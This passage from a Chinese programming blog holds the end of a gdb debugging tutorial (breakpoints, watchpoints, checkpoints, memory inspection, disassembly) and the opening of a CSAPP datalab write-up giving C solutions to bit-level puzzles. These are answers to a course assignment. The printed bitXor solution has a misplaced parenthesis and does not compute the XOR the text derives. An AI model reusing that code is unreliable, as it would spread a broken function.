gfg.cpp</span><br></pre></td></tr></table></figure><p>执行:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb gfg</span><br></pre></td></tr></table></figure><p>开启gdb:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621144320382.png" alt="image-20200621144320382"></p><p>首先介绍的是break(b) 命令, 这是用来设置断点的命令, 它的使用格式如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b</span><br><span class="line">break [function name]</span><br><span class="line">break [file name]:[line number]</span><br><span class="line">break [line number]</span><br><span class="line">break *[address] # 这个用来调试汇编很有用</span><br><span class="line">break ***any of the above arguments*** if [condition]</span><br><span class="line">b ***any of the above arguments*** </span><br></pre></td></tr></table></figure><p>使用:<code>b main</code> 对main函数设置断点.</p><p>然后执行:<code>r 1 10 100</code>命令,把程序跑起来. <code>1 10 100</code>是要传入的参数</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151305820.png" alt="image-20200621151305820"></p><p>可以看到,程序停在了Breakpoint 1这里, break point 1中的1是什么? gdb为每个断点设定了一个id. </p><p>怎么查看当前设置了哪些断点?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info b</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621150915280.png" alt="image-20200621150915280"></p><p>第一列Num就是break point id.  Enb表示当前断点是enable的, 可以通过 <code>disable breakpoint id</code> disable一个断点. What字段表明了当前断点的位置.</p><p>ok, 现在我们做到了. 1. 设置断点.2. 查看断点. 3. 其中程序.</p><p>接下来我们就一步步的debug吧.</p><p>使用 <code>n</code>或者 s进行单步调试,(两者的区别在于,step遇到函数会进入函数, next不会). </p><p>值得说明的是, 执行一条命令后, 直接按回车, 会重复执行上一条命令.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151435600.png" alt="image-20200621151435600"></p><p>现在应该会单步调试了吧.</p><p>使用 <code>bt</code>,可以查看函数调用堆栈:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152801080.png" alt="image-20200621152801080"></p><p>使用 <code>p a</code>可以打印a变量的值:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152828266.png" alt="image-20200621152828266"></p><p>p还可以使用格式符, 如 <code>p /x a</code>把a以hex格式打印, 对于数组,如 int arr[3]; 可以使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p *arr@3</span><br></pre></td></tr></table></figure><p>打印. @后跟的是数组长度. </p><p>但是到现在, 有一个很严重的问题, 那就是在debug的时候 ,没办法查看源代码。</p><p>gdb当然想到了这个问题, 我们可以通过 <code>l</code>命令, 展示最近的源代码.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151620849.png" alt="image-20200621151620849"></p><p>l 命令默认展示10行代码, 可以通过 l [start_line] [end_line] 展示start_line – end_line之间的代码.</p><p>可是, 这还是非常难受, 比如我甚至不知道当前执行到哪儿了.</p><p>ok, 接下来介绍一个必备的命令: layout</p><p>执行 <code>h layout</code>可以查看layout的帮助:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151826603.png" alt="image-20200621151826603"></p><p>我们关注 LAYOUT-NAME即可.</p><p>可以看到,LAYOUT-NAME有四个选项:</p><ul><li><p>layout src. 展示源代码和命令窗口:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151917633.png" alt="image-20200621151917633"></p><p>这就搞定了我们在调试代码时,要查看同步查看源代码的需求. 上面展示了我们当前执行到了哪里. B+展示了我们的断点位置.</p></li><li><p>layout asm</p><p>反汇编布局, 可以查看对应的反汇编代码.</p></li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152053830.png" alt="image-20200621152053830"></p><p>这个在bomblab中肯定是要用的. 平常基本不适用,毕竟汇编用得确实不多.</p><ul><li>layout split</li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152229097.png" alt="image-20200621152229097"></p><p>这个就是同时展示, src和asm. 没什么好说的.</p><ul><li>layout regs</li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152325113.png" alt="image-20200621152325113"></p><p>展示寄存器窗口. 这个在bomblab中也是必备的. 可以分析各寄存器当前的值. <strong>值得注意的是,有时候终端会花屏, 这时执行refresh(或Ctrl+L)命令即可</strong></p><p>ok,  上面都是一些基础操作. 下面按照需求,一个个讲解.</p><h3 id="问题1-如何设置条件断点"><a href="#问题1-如何设置条件断点" class="headerlink" title="问题1: 如何设置条件断点?"></a>问题1: 如何设置条件断点?</h3><p>比如在main函数中, 我们只在 a = 10时,才停下. 则可以通过 <code>b 16 if a == 10</code>命令完成.</p><p>上面代码的含义时， 在代码16行， 如果a==10，则停下，否则忽略。</p><h3 id="问题2-卡在一直长循环-如何跳出这个循环"><a href="#问题2-卡在一直长循环-如何跳出这个循环" class="headerlink" title="问题2: 卡在一直长循环, 如何跳出这个循环?"></a>问题2: 卡在一直长循环, 如何跳出这个循环?</h3><p>看下面这个代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; <span class="number">1000</span>; i++)</span><br><span class="line"><span class="number">2</span>: &#123;</span><br><span class="line"><span class="number">3</span>: <span class="comment">// do something</span></span><br><span class="line"><span class="number">4</span>: &#125;</span><br><span class="line"><span class="number">5</span>: <span class="keyword">int</span> a = <span class="number">10</span>;</span><br></pre></td></tr></table></figure><p>假设我们在第一行打了断点 <code>b 1</code>, 现在通过 <code>n或i</code>进入了for循环, 此时如何快速执行完这个循环呢? 可以在第5行打断点 <code>b 5</code>, 然后执行 <code>c</code>  continue命令, 就可以快速执行到第5行了.</p><h3 id="问题3-如何删除断点或disable断点"><a href="#问题3-如何删除断点或disable断点" class="headerlink" title="问题3: 如何删除断点或disable断点"></a>问题3: 如何删除断点或disable断点</h3><p>其实前文已经提到了, 每个断点都有一个id, 通过 <code>info b</code>查看, 然后执行d breakpointid即可.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621153643799.png" alt="image-20200621153643799"></p><h3 id="问题4-如何快速清除一个函数中的所有断点"><a href="#问题4-如何快速清除一个函数中的所有断点" class="headerlink" title="问题4: 如何快速清除一个函数中的所有断点"></a>问题4: 如何快速清除一个函数中的所有断点</h3><p>使用clear命令, clear FUNCTION_NAME 即可.</p><h3 id="问题5-如何保存一个程序的快照"><a href="#问题5-如何保存一个程序的快照" class="headerlink" title="问题5: 如何保存一个程序的快照"></a>问题5: 如何保存一个程序的快照</h3><p>有时候我们在debug时, 在到达某个debug点之前, 要做很多重复的工作, 这时,我们可以在这个点上生成一个快照, 这次debug失败后, 下次直接从这个快照中继续运行. </p><p>此时就可以用checkpoint来做.</p><p>比如上文的程序, 我可以当 a = 10时,生成一个快照, 然后下次直接从a=10启动程序.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621154337275.png" alt="image-20200621154337275"></p><p>执行 c, run完当前进程. 会看到context自动切换到了下一个进程.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621154515768.png" alt="image-20200621154515768"></p><p>或者手动执行 <code>restart checkpointid</code>, 手动切换.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621154556161.png" alt="image-20200621154556161"></p><h3 id="问题6-监听某个变量-变量发生变化时-自动打印该变量"><a href="#问题6-监听某个变量-变量发生变化时-自动打印该变量" class="headerlink" title="问题6: 监听某个变量, 变量发生变化时, 自动打印该变量"></a>问题6: 监听某个变量, 变量发生变化时, 自动打印该变量</h3><p>使用watch 命令.</p><p>比如监听i变量,只要i发生了变化, 就自动打印它.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621154853484.png" alt="image-20200621154853484"></p><h3 id="问题7-每次停顿-都要打印一些想要监听的变量"><a href="#问题7-每次停顿-都要打印一些想要监听的变量" class="headerlink" title="问题7: 每次停顿, 都要打印一些想要监听的变量"></a>问题7: 每次停顿, 都要打印一些想要监听的变量</h3><p>使用display命令.</p><p>display [var] 可以在每次程序debug中停顿时,打印你想知道的变量值.</p><p>如,我要监听 i可以:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">display i</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621155215978.png" alt="image-20200621155215978"></p><p>可以看到, 每次停下, i的值都打印了出来.</p><h3 id="问题8-如何切换stack-frame"><a href="#问题8-如何切换stack-frame" class="headerlink" title="问题8: 如何切换stack frame"></a>问题8: 如何切换stack frame</h3><p>有时候, 我们进入到某个函数后, 想要重新查看另一个stack frame的局部变量.比如:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621155435491.png" alt="image-20200621155435491"></p><p>当前在findSqure stack frame中, 想要切换到main frame中去.</p><p>可以通过 <code>frame frameid</code>切换, 这里是<code>frame 1</code>切换.</p><p>如何函数调用层次过深, 可以使用frame命令,如果只是想查看两个较为临近的frame, 使用 <code>up num或down num</code>命令更合适.up代表向上走多少个frame, down则是向下.</p><h3 id="问题9-更换执行程序"><a href="#问题9-更换执行程序" class="headerlink" title="问题9:更换执行程序"></a>问题9:更换执行程序</h3><p>想要在gdb中直接加载另一个程序, 使用<code>file [file_path]</code> 命令即可.</p><h3 id="问题10-打印某个内存区域中的值"><a href="#问题10-打印某个内存区域中的值" class="headerlink" title="问题10:打印某个内存区域中的值"></a>问题10:打印某个内存区域中的值</h3><p>这个问题在c语言中相当场景, 比如要打印数组的value, 打印某个特定内存位置的值. 都可以使用.</p><p>使用 <code>x</code>命令解决这个问题, x命令的格式如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /[num][format][width] address</span><br></pre></td></tr></table></figure><ul><li>address没什么可说的.就是你要查看的内存开始地址.</li><li>num: 打印多少个单元</li><li>format: 以什么格式打印, 通过有 十六进制(x), 十进制(d), 八进制(o), 字符(c). 具体可通过h x查看</li><li>width: 一个单元的宽度, 常见单位为 byte 8bit(b), half word 16bit(h), word 32bit (w), gaint 64bit(g). 同样,可通过h x查看.</li></ul><p>下面就用一些例子来说明吧.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">10</span>] = <span class="string">&quot;hello&quot;</span>;</span><br></pre></td></tr></table></figure><p>现在,要以 字符形式打印buf. 应该怎么写命令?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /10cb buf</span><br></pre></td></tr></table></figure><ul><li>10: 代表10个单元</li><li>c: 代表以字符形式打印</li><li>b: 一个单元1个字节,(从语言中的char的长度为1)</li></ul><p>又如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /4dw arr</span><br></pre></td></tr></table></figure><ul><li>4: 4个单元</li><li>d: 十进制打印</li><li>w: 一个单元32bit</li></ul><p>ok, 到这里基本的调试操作应该都满足了, 如果遇到什么不知道的,直接百度或者查看help吧。</p><h2 id="2-反汇编"><a href="#2-反汇编" class="headerlink" title="2. 反汇编"></a>2. 反汇编</h2><p>gdb也是支持反汇编的, 这也是bomblab必备的能力.</p><p>同样以下面代码为例:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findSquare</span><span class="params">(<span class="keyword">int</span> a)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> a * a; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span>** args)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">int</span> a = atoi(args[i]); </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; findSquare(a) &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>演示如何反汇编.</p><p>启动gdb,  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b main</span><br><span class="line">r 1</span><br></pre></td></tr></table></figure><p>通过 disassemble命令进行反汇编.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621161232831.png" alt="image-20200621161232831"></p><p>如果指向反汇编时,添加源代码和行号, 执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble &#x2F;s</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621161438046.png" alt="image-20200621161438046"></p><p>上面的命令用来临时看看汇编还可以, 但是要跟踪还是得使用layout命令.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">layout asm</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621161534374.png" alt="image-20200621161534374"></p><h3 id="问题1-为某个特定的指令地址加断点"><a href="#问题1-为某个特定的指令地址加断点" class="headerlink" title="问题1: 为某个特定的指令地址加断点"></a>问题1: 为某个特定的指令地址加断点</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *address</span><br><span class="line">b *(function_name + offset)</span><br></pre></td></tr></table></figure><p>如:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621161656224.png" alt="image-20200621161656224"></p><p>ok, gdb的简单使用就到这里了.</p><p><strong>还有个打断点的方式是, 代码走到了指令的位置, 直接输入b, 就在当前位置打了断点.</strong></p><h3 id="问题2：-导出汇编代码"><a href="#问题2：-导出汇编代码" class="headerlink" title="问题2： 导出汇编代码"></a>问题2： 导出汇编代码</h3><p>好吧，这个我并不知道如何用gdb实现， 改用 objdump -d 命令即可实现。</p><h2 id="3-额外推荐"><a href="#3-额外推荐" class="headerlink" title="3. 额外推荐"></a>3. 额外推荐</h2><p>cgdb: gdb的包装， 默认打开了源代码试图，而且采用了vim模式查看源代码，熟悉vim和gdb的可以试试。</p><p>gdbgui: 这个还不错, 采用browser进行调试,比只使用gdb还是好多了.</p><h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZ2Vla3Nmb3JnZWVrcy5vcmcvZ2RiLWNvbW1hbmQtaW4tbGludXgtd2l0aC1leGFtcGxlcy8=" title="https://www.geeksforgeeks.org/gdb-command-in-linux-with-examples/">gdb command in Linux with examples - GeeksforGeeks<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhaWR1XzI0MjU2NjkzL2FydGljbGUvZGV0YWlscy80NzI5ODUxMw==" title="https://blog.csdn.net/baidu_24256693/article/details/47298513">gdb中x的用法_lxy的专栏-CSDN博客_gdb x<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbmdjaHV3YW5nMTg2OC9hcnRpY2xlL2RldGFpbHMvODYxMzIyODE=" title="https://blog.csdn.net/songchuwang1868/article/details/86132281">GDB常用命令与技巧（超好用的图形化gdbgui）_Likes的博客-CSDN博客_gdbgui<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gdb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Csapp-Datalab详解</title>
      <link href="/archives/2d758396.html"/>
      <url>/archives/2d758396.html</url>
      
        <content type="html"><![CDATA[<p>准备把csapp详细看一遍，所有lab都做一遍，加深理解。</p><p>本篇是datalab的个人解法，<strong>所以很可能不是最优解</strong>。</p><p>原课程地址：<span class="exturl" data-url="aHR0cDovL3d3dy5jcy5jbXUuZWR1L2Fmcy9jcy9hY2FkZW1pYy9jbGFzcy8xNTIxMy1mMTUvd3d3L3NjaGVkdWxlLmh0bWw=" title="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/schedule.html">http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/schedule.html<i class="fa fa-external-link"></i></span></p><p>ok，现在就来一道道题说明。</p><h2 id="0-说明"><a href="#0-说明" class="headerlink" title="0. 说明"></a>0. 说明</h2><p>datalab着重于让学生理解 数字（integer，float point)在bit level上的表示与操作。通过限制学生的操作集（如仅能使用 ~, |, +等此操作），让学生在bit level上思考问题。</p><a id="more"></a><p>more detail:</p><p><strong>对于Integer类型的题型：</strong></p><ol><li>所能使用的常量范围在 0 - 255之间；</li><li>只能使用函数参数和局部变量；</li><li>有限操作集， ！，~， &amp; ^ | + &lt;&lt;  &gt;&gt; （每道题有各自详细的操作集解释）</li><li>不能使用任何的 if, else, do, while, for, switch等</li><li>不能使用marco</li><li>不能调用函数</li><li>不能使用 &amp;&amp; ||  -  ？</li><li>不能使用类型转换</li><li>不能自定义任何类型（如struct， union， array等），实际上，所有题型都只能使用int</li></ol><p><strong>程序环境说明：</strong></p><ol><li>程序为32位程序，</li><li>右移操作默认为算数右移（也就是补充符号位）</li></ol><p><strong>对于float类型的题型：</strong></p><p>可以使用， if, else, loop等。只能使用int, unsigned类型。</p><p>不能，定义宏，调用函数，类型转换，自定义类型，使用任何float类型的操作。</p><h2 id="1-bitXor"><a href="#1-bitXor" class="headerlink" title="1. bitXor"></a>1. bitXor</h2><p>题目：</p><ul><li>目标：实现x ^ y. </li><li>限制：只能使用操作符 ~, &amp;</li><li>最大操作次数： 14</li><li>难度：1</li></ul><p>解法：</p><p>这道题，我是从“数字电路”中的真值表去思考的，异或操作的真值表如下:</p><table><thead><tr><th align="center">X</th><th align="center">Y</th><th align="center">Z</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">0</td><td align="center">0</td></tr><tr><td align="center">0</td><td align="center">1</td><td align="center">1</td></tr><tr><td align="center">1</td><td align="center">0</td><td align="center">1</td></tr><tr><td align="center">1</td><td align="center">1</td><td align="center">0</td></tr></tbody></table><p>所以可列：<br>$$<br>X \overline{Y} + \overline{X}Y = Z<br>$$<br>利用两次反，数不变原则，可变形为:<br>$$<br>\overline{ (\overline{X\overline{Y}})(\overline{\overline{X}Y}) } = Z<br>$$<br>则可得:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">return</span> ~(  (~(x &amp; ~y))) &amp; (~(~x &amp; y)  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-tmin"><a href="#2-tmin" class="headerlink" title="2. tmin"></a>2. tmin</h2><p>题目：</p><ul><li>目标：返回最小补码数 ，即0x80000000. </li><li>限制：只能使用操作符  ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>最大操作次数： 4</li><li>难度：1</li></ul><p>解法：</p><p>这个题应该是最简单的了，没什么可说的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-isTmax"><a href="#3-isTmax" class="headerlink" title="3. isTmax"></a>3. isTmax</h2><p>题目：</p><ul><li>目标：判断x是否是Tmax，如果是，返回1，否则返回0。</li><li>限制：只能使用操作符  ! ~ &amp; ^ | +</li><li>最大操作次数： 10</li><li>难度：2</li></ul><p>解法：</p><p>既然是要判断x == Tmax，那么就要思考Tmax的特殊性。 Tmax = 0x7f ff ff ff.</p><p>观察到一个性质， Tmax+1 = ~Tmax. 即<br>$$<br>0X7fffffff+1 = \sim0X80000000<br>$$<br>但是还得想一下，还有其它数，有相同的性质吗？</p><p>yes，的确有 ， 0xff ff ff ff也满足这样的性质。</p><p>所以，现在问题需要加一个过滤，把0xff ff ff ff过滤掉。如何过滤呢？这就要思考 0x7f ff ff ff和0xff ff ff ff的不同了。</p><p>又观察到0xff ff ff ff+1 = 0，而0x7f ff ff ff + 1 = 0x80 00 00 00。  所以，可以利用这个特性，把0xff ff ff ff给过滤掉。 <strong>具体是采用 !! 运算。</strong></p><p>对于!! 来说：</p><table><thead><tr><th>运算</th><th>原</th><th>运算后</th></tr></thead><tbody><tr><td>!!</td><td>0</td><td>0</td></tr><tr><td>!!</td><td>非0</td><td>1</td></tr></tbody></table><p>所以有： !!(0x7f ff ff ff + 1) = 1, 而!!(0xff ff ff ff+1) = 0。</p><p>于是，代码为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !((x + <span class="number">1</span>) ^ ~x) &amp; !!(x + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-allOddBits"><a href="#4-allOddBits" class="headerlink" title="4. allOddBits"></a>4. allOddBits</h2><p>题目：</p><ul><li>目标：如果x的二进位的所有奇数位全位1，则返回1，否则返回0。 <em>注：二进制最低位是第0位。</em></li><li>例子：allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</li><li>限制：只能使用操作符! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>最大操作次数： 12</li><li>难度：2</li></ul><p>解法：</p><p> 这个题目难度不大,生成0xaa aa aa aa即可，然后判定是否相同即可（通过异或+! 可以判定）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = <span class="number">0xaa</span>;</span><br><span class="line">    temp = temp &lt;&lt; <span class="number">8</span> | temp; <span class="comment">// 0x aa aa</span></span><br><span class="line">    temp = temp &lt;&lt; <span class="number">8</span> | temp; <span class="comment">// 0x aa aa aa</span></span><br><span class="line">    temp = temp &lt;&lt; <span class="number">8</span> | temp; <span class="comment">// 0x aa aa aa aa</span></span><br><span class="line">    <span class="keyword">return</span> !((x &amp; temp) ^ temp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-negate"><a href="#5-negate" class="headerlink" title="5. negate"></a>5. negate</h2><p>题目：</p><ul><li>目标：返回-x</li><li>限制：只能使用操作符 ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>最大操作次数：5</li><li>难度：2</li></ul><p>解法：</p><p>这题也很简单，取反+1即可，算是一个二进制的公式吧。只是要记住  -Tmin = Tmin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (~x) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-isAsciiDigit"><a href="#6-isAsciiDigit" class="headerlink" title="6. isAsciiDigit"></a>6. isAsciiDigit</h2><p>题目：</p><ul><li>目标： return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters ‘0’ to ‘9’)</li><li>例子：<ul><li>isAsciiDigit(0x35) = 1.</li><li>isAsciiDigit(0x3a) = 0.</li><li>isAsciiDigit(0x05) = 0.</li></ul></li><li>限制：只能使用操作符   ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li><li>最大操作次数：15</li><li>难度：3</li></ul><p>解法：</p><p>这道题的整体思路也比较简单，考虑一个更通用的方法， 如何判定 x&lt;=y?  也就是 x- y &lt;= 0. 即 x-y 的符号位为1即可（这里没有考虑负溢出问题）。</p><p>所以看代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> acsii_zero = <span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">int</span> acsii_nine = <span class="number">0x39</span>;</span><br><span class="line">    <span class="keyword">int</span> negative_acsii_zero = ~acsii_zero + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> negative_acsii_nine = ~acsii_nine + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> result1 = !(((x + negative_acsii_zero) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>); <span class="comment">//0x30 &lt;= x</span></span><br><span class="line">    <span class="keyword">int</span> result2 = ((x + negative_acsii_nine) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;    <span class="comment">// x &lt; 0x39</span></span><br><span class="line">    <span class="keyword">int</span> result3 = !(x + (negative_acsii_nine));             <span class="comment">// x = 0x39</span></span><br><span class="line">    <span class="keyword">return</span> result1 &amp; (result2 | result3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7-conditional"><a href="#7-conditional" class="headerlink" title="7. conditional"></a>7. conditional</h2><p>题目：</p><ul><li>目标：实现三目运算符  same as x ? y : z </li><li>限制：只能使用操作符   ! ~ &amp; ^ | + &lt;&lt;  &gt;&gt;</li><li>最大操作次数：16</li><li>难度：3</li></ul><p>解法：</p><p>这道题其实颇为巧妙，同样用到了数电中的思想，注意，只是思想，实现起来是不一样的。<br>$$<br>RESULT  = XY +  